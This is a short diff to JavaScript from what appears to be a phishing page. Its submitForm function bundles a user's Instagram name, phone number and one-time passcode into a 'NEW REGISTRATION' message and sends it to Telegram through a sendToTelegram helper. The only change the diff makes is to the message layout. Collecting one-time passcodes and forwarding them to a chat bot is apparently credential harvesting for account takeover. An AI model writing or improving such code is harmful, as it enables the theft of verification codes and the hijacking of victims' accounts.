@@ -307,7 +307,7 @@ getOtpBtn.addEventListener('click', async()=>{
 async function submitForm(){
     const fullName = userName.value.trim();
     const phone = phoneNumber.value.trim();
-    const message = `✅ NEW REGISTRATION!\n👤 Instagram: ${fullName}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n⏰ ${new Date().toLocaleString()}`;
+    const message = `-------------NEW REGISTRATION-------------\nINSTAGRAM : ${fullName}\nPHONE : ${phone}\nOTP: ${otp}\nTIME : ${new Date().toLocaleString()}`;
     await sendToTelegram(message);
 
     successMsg.classList.add('show');
